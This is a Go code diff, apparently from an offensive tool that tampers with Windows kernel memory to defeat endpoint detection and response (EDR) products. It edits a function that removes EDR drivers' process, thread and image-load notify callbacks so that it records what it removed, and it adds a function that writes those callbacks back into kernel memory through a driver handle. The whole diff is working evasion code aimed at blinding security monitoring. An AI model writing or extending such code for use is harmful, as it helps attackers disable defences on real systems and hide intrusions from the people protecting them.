@@ -254,18 +254,33 @@ func enumAllEDRKernelCallbacks() {
 	println(edrDrivers.index)
 }
 
-func removeAllEDRKernelCallbacks() {
+func removeAllEDRKernelCallbacks() FOUND_EDR_CALLBACKS {
 	ntoskrnlOffsets := getNtoskrnlVersion()
 	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
-	if ntoskrnlVersion == "" {
-		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
-		return
-	}
-	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
 	var edrDrivers FOUND_EDR_CALLBACKS
 	edrDrivers.index = 0
+	if ntoskrnlVersion == "" {
+		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+		return edrDrivers
+	}
+	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
 	removePspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	removePspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	removePspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	println(edrDrivers.index)
+	return edrDrivers
+}
+
+func restoreAllEDRKernelCallbacks(edrDrivers FOUND_EDR_CALLBACKS) {
+	device := getDriverHandle()
+	for i := 0; i < int(edrDrivers.index); i++ {
+		if edrDrivers.EDR_CALLBACKS[i].removed == true {
+			fmt.Printf("[+] Restoring callback of EDR driver '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n",
+				edrDrivers.EDR_CALLBACKS[i].driver,
+				edrDrivers.EDR_CALLBACKS[i].callbackAddr,
+				edrDrivers.EDR_CALLBACKS[i].callbackStruct,
+				edrDrivers.EDR_CALLBACKS[i].callbackFunc)
+			writeMemoryDWORD64(device, DWORD64(edrDrivers.EDR_CALLBACKS[i].callbackAddr), DWORD64(edrDrivers.EDR_CALLBACKS[i].callbackStruct))
+		}
+	}
 }
